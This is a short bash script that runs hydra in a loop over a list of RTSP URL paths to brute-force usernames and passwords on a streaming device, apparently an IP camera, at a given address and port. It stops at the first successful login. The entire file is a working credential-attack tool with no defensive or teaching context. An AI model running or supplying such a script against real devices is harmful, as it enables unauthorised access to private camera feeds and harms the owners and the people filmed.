#! /usr/bin/bash

# Usage:
#   rtsp_brute.sh [wordlist] [ip] [port] [urllist]

# For every line in the "rtsp_urls.txt" file, try a brute force attack.
while read line; do
    # Run hydra
    hydra -L $1 -P $1 -f rtsp://$2:$3$line rtsp

    # Stop if we find a match
    if [ $? -eq 0 ]; then break; fi
done < $4